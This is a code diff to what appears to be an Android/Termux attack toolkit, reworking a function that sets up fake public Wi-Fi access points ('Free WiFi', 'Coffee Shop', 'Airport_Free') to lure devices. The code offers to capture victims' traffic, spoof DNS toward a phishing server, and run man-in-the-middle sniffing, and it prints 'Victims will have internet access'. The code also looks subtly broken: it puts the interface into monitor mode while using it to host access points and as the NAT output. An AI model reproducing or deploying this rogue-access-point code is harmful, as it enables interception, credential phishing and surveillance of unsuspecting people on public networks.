@@ -298,11 +298,7 @@ def create_multiple_aps(interface):
     try:
         print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
         
-        # Setup network
-        os.system(f"su -c 'airmon-ng check kill'")
-        os.system(f"su -c 'airmon-ng start {interface}'")
-        
-        # Create fake APs
+        # Common network names to appear legitimate
         ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
         
         print(f"\n{Fore.YELLOW}Select action when device connects:")
@@ -313,42 +309,41 @@ def create_multiple_aps(interface):
         
         action = input(f"\n{Fore.CYAN}Choose action: {Fore.RESET}")
         
-        # Setup internet sharing
-        os.system(f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")  # Enable IP forwarding
-        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE'")  # NAT rule
-        os.system(f"su -c 'iptables -A FORWARD -i at0 -j ACCEPT'")  # Allow forwarding
+        # Enable monitor mode directly
+        os.system(f"su -c 'ifconfig {interface} down'")
+        os.system(f"su -c 'iwconfig {interface} mode monitor'")
+        os.system(f"su -c 'ifconfig {interface} up'")
         
-        # Start DHCP server
-        os.system(f"su -c 'dnsmasq --interface=at0 --dhcp-range=192.168.1.2,192.168.1.100,12h'")
+        # Setup internet sharing
+        os.system(f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
+        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE'")
         
         # Create APs
         for ssid in ssid_list:
-            os.system(f"su -c 'airbase-ng -e \"{ssid}\" -c {random.randint(1,11)} {interface}mon &'")
+            os.system(f"su -c 'hostapd -B /data/data/com.termux/files/home/{ssid}.conf'")
             print(f"{Fore.GREEN}[+] Created AP: {ssid}{Fore.RESET}")
-        
-        print(f"\n{Fore.YELLOW}[*] Setting up network...{Fore.RESET}")
-        os.system(f"su -c 'ifconfig at0 up'")
-        os.system(f"su -c 'ifconfig at0 192.168.1.1 netmask 255.255.255.0'")
-        
-        print(f"{Fore.GREEN}[+] Network ready! Victims will have internet access{Fore.RESET}")
+            
+        print(f"{Fore.GREEN}[+] Network ready! Monitoring for connections...{Fore.RESET}")
         
         while True:
             if action == "1":
-                os.system(f"su -c 'airodump-ng -w capture {interface}mon'")
+                os.system(f"su -c 'tcpdump -i {interface} -w capture.pcap'")
             elif action == "2":
                 fake_ip = input(f"{Fore.CYAN}Enter your phishing server IP: {Fore.RESET}")
                 dns_spoof("192.168.1.2", fake_ip)
             elif action == "3":
                 mitm_sniffer(interface)
             else:
-                os.system(f"su -c 'airodump-ng {interface}mon'")
+                os.system(f"su -c 'tcpdump -i {interface}'")
             
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
-        os.system(f"su -c 'killall airbase-ng dnsmasq'")
+        os.system(f"su -c 'killall hostapd'")
         os.system(f"su -c 'iptables -F'")
         os.system(f"su -c 'iptables -t nat -F'")
-        os.system(f"su -c 'airmon-ng stop {interface}mon'")
+        os.system(f"su -c 'ifconfig {interface} down'")
+        os.system(f"su -c 'iwconfig {interface} mode managed'")
+        os.system(f"su -c 'ifconfig {interface} up'")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
